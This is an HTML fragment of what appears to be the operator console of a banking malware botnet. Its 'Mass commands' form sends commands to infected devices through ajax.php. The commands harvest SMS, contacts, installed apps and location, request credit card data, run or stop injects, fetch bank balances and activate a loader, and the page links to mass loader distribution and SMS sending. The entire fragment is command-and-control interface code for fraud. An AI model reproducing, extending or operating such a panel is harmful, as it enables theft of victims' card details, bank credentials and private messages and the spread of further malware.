<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>Console manager</title>
	
	<!-- Bootstrap core CSS-->
	  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	  <!-- Custom fonts for this template-->
	  <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
	  <!-- Custom styles for this template-->
	  <link href="css/sb-admin.css" rel="stylesheet">
	
	<script src="https://api-maps.yandex.ru/2.1/?lang=ru_RU" type="text/javascript"></script>
	
	<!-- Bootstrap core JavaScript-->
		<script src="vendor/jquery/jquery.min.js"></script>
		<script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
		<!-- Core plugin JavaScript-->
		<script src="vendor/jquery-easing/jquery.easing.min.js"></script>
		<!-- Custom scripts for all pages-->
		<script src="js/sb-admin.min.js"></script>
  </head>
  
  <body class="fixed-nav sticky-footer bg-dark" id="page-top">
	

<!-- Modal add command -->
		<div class="modal fade" id="CommandModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
		  <div class="modal-dialog" role="document">
			<div class="modal-content">
			  <div class="modal-header">
				<h5 class="modal-title" id="exampleModalLabel">Mass commands</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
				  <span aria-hidden="true">&times;</span>
				</button>
			  </div>
			  <form action=ajax.php method=post>
				<input type=hidden name=op value=setmasscommand>
				<div class="modal-body">
					<div class="form-check">
						<label class="form-check-label">
						  <input type="checkbox" class="form-check-input" name=cod[] value=getbasicinfo>
						  Request basics info (sms,contacts,apps,geo)
						</label>
					  </div>
				  
					<div class="form-check">
						<label class="form-check-label">
						  <input type="checkbox" class="form-check-input" name=cod[] value=getcc>
						  Request CC
						</label>
					  </div>
					  
					 <div class="form-check">
						<label class="form-check-label">
						  <input type="checkbox" class="form-check-input" name=cod[] value=setinjects>
						  Run Injects
						</label>
					  </div>
					  <div class="form-check">
						<label class="form-check-label">
						  <input type="checkbox" class="form-check-input" name=cod[] value=delinjects>
						  Stop Injects
						</label>
					  </div>
					  <div class="form-check">
						<label class="form-check-label">
						  <input type="checkbox" class="form-check-input" name=cod[] value=getbalances>
						  Get bank balances
						</label>
					  </div>
					  <hr>
					  <div class="form-check">
						<label class="form-check-label">
						  <input type="checkbox" class="form-check-input" name=cod[] value=activateloader>
						  Activate loader
						</label>
					  </div>
				  </div>
				  <div class="modal-footer">
					<a href=loader.php>[Loader mass send]</a> 
					<a href=sms.php>[Send SMS]</a> 
					<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
					<button type="submit" class="btn btn-primary">GO!</button>
				  </div>
			  </form>
			</div>
		  </div>
		</div>
